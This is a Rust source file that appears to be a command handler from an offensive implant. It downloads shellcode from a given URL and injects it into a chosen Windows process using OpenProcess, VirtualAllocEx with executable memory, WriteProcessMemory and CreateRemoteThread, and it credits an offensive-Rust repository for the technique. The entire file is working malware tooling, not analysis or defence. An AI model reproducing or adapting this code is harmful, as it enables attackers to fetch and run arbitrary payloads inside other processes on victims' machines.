use std::error::Error;
use std::env::current_dir;

pub async fn handle(s: String) -> Result<String, Box<dyn Error>> {
    #[cfg(windows)] {
        // Input: url to shellcode -p pid
        let mut args = s.split(" ");
        // Get URL as the first arg
        let url = args.nth(0).unwrap();
        // Get path as the 2nd arg or the last part of the URL
        if let Some(p) = args.nth(0) {
            println!("Injecting into PID {:?}", p);
            let pid: u32 = p.parse()?;
            let client = Client::new();
            let r = client.get(url).send().await?;
            if r.status().is_success() {
                // Here comes the injection
                let shellcode = r.bytes().await?;
                // Big thanks to trickster0
                // https://github.com/trickster0/OffensiveRust/tree/master/Process_Injection_CreateThread
                unsafe {
                    let h = kernel32::OpenProcess(PROCESS_ALL_ACCESS, winapi::shared::ntdef::FALSE.into(), pid);
                    let addr = kernel32::VirtualAllocEx(h, ptr::null_mut(), shellcode.len() as u64, MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
                    let mut n = 0;
                    kernel32::WriteProcessMemory(h,addr,shellcode.as_ptr() as  _, shellcode.len() as u64,&mut n);
                    let _h_thread = kernel32::CreateRemoteThread(h, ptr::null_mut(), 0 , Some(std::mem::transmute(addr)), ptr::null_mut(), 0, ptr::null_mut());
                    kernel32::CloseHandle(h);
                }
                return Ok("Injection completed!".to_string());
            } else {
                return Ok("Could not download shellcode".to_string());
            }     
        } else {
            return Ok("No valid pid provided".to_string());
        }
    }
    
    #[cfg(not(windows))] {
        Ok("Can only inject shellcode on Windows!".to_string())
    }
}